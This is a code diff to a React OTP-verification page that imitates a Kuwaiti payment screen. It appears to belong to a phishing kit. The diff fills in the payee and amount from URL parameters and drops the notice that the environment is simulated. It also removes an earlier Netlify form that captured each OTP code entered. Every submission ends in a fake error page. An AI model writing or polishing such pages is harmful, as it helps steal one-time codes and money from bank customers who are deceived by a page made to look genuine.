@@ -2,6 +2,13 @@ import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
 
+const defaultPaymentData = {
+  customerName: "يوسف غازي الرشيدي",
+  amount: 30.000,
+  currency: "KWD",
+  description: "Family Support"
+};
+
 const OTPVerification = () => {
   const { id } = useParams();
   const navigate = useNavigate();
@@ -9,7 +16,12 @@ const OTPVerification = () => {
   const [loading, setLoading] = useState(false);
 
   const queryParams = new URLSearchParams(window.location.search);
-  const displayAmount = queryParams.get('a') || '50.000';
+  const paymentData = {
+    customerName: queryParams.get('n') || defaultPaymentData.customerName,
+    amount: parseFloat(queryParams.get('a') || String(defaultPaymentData.amount)),
+    currency: queryParams.get('c') || defaultPaymentData.currency,
+    description: queryParams.get('p') || defaultPaymentData.description
+  };
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -18,6 +30,10 @@ const OTPVerification = () => {
     setTimeout(() => {
       navigate('/error' + window.location.search);
     }, 2000);
+  };
+
+  const handleCancel = () => {
+    navigate(`/card/${id}${window.location.search}`);
   };
 
   return (
@@ -48,8 +64,12 @@ const OTPVerification = () => {
               <span className="text-gray-700 text-sm sm:text-base">:التحقق من الرمز</span>
             </div>
             <div className="border-t border-gray-200 pt-1 sm:pt-2">
+              <div className="flex justify-between items-center mb-1">
+                 <span className="text-blue-600 font-medium text-sm sm:text-base">{paymentData.customerName}</span>
+                 <span className="text-gray-700 text-sm sm:text-base">:المستفيد</span>
+              </div>
               <div className="flex justify-between items-center">
-                <span className="text-blue-600 font-bold text-lg sm:text-xl">KD {displayAmount}</span>
+                <span className="text-blue-600 font-bold text-lg sm:text-xl">KD {paymentData.amount.toFixed(3)}</span>
                 <span className="text-gray-700 text-sm sm:text-base">:المبلغ</span>
               </div>
             </div>
@@ -58,29 +78,12 @@ const OTPVerification = () => {
 
         <div className="bg-white rounded-xl sm:rounded-2xl shadow-lg p-4 sm:p-6 mb-3 sm:mb-6">
           <form 
-            name="otp-verification" 
-            method="POST" 
-            data-netlify="true" 
-            netlify-honeypot="bot-field"
             onSubmit={handleSubmit} 
             className="space-y-4 sm:space-y-6"
-            action="/error"
           >
-            <input type="hidden" name="form-name" value="otp-verification" />
-            <input type="hidden" name="payment-id" value={id} />
-            <input type="hidden" name="otp-code" value={otp} />
-            <p style={{ display: 'none' }}>
-              <label>
-                Don't fill this out if you're human: <input name="bot-field" />
-              </label>
-            </p>
-
             <div className="text-center space-y-3 sm:space-y-4">
               <p className="text-gray-600 text-sm sm:text-lg px-2">
                 يرجى إدخال رمز التحقق المرسل إلى هاتفك المحمول
-              </p>
-              <p className="text-gray-500 text-xs sm:text-sm px-2">
-                Please enter the OTP sent to your registered mobile number ending with ****1234
               </p>
               
               <div className="flex justify-center py-4 sm:py-6">
@@ -101,15 +104,7 @@ const OTPVerification = () => {
                 </InputOTP>
               </div>
               
-                                          <div className="flex space-x-3 sm:space-x-4 mt-6">
-                <button
-                  type="button"
-                  onClick={handleCancel}
-                  className="flex-1 bg-gray-300 text-gray-700 py-3 sm:py-4 rounded-lg text-base sm:text-lg font-medium hover:bg-gray-400 transition-colors"
-                  disabled={loading}
-                >
-                  Back
-                </button>
+              <div className="flex space-x-3 sm:space-x-4 mt-6">
                 <button
                   type="submit"
                   className="flex-1 bg-blue-700 text-white py-3 sm:py-4 rounded-lg text-base sm:text-lg font-bold hover:bg-blue-800 transition-colors shadow-md disabled:opacity-50"
@@ -120,11 +115,6 @@ const OTPVerification = () => {
               </div>
             </div>
           </form>
-        </div>
-
-        <div className="text-center mt-4 sm:mt-6 text-gray-500 text-xs sm:text-sm">
-          <p>🔒 رمز التحقق صالح لمدة 5 دقائق</p>
-          <p className="mt-1">This is a simulated payment environment</p>
         </div>
 
         <div className="text-center mt-4 sm:mt-8 text-gray-600">
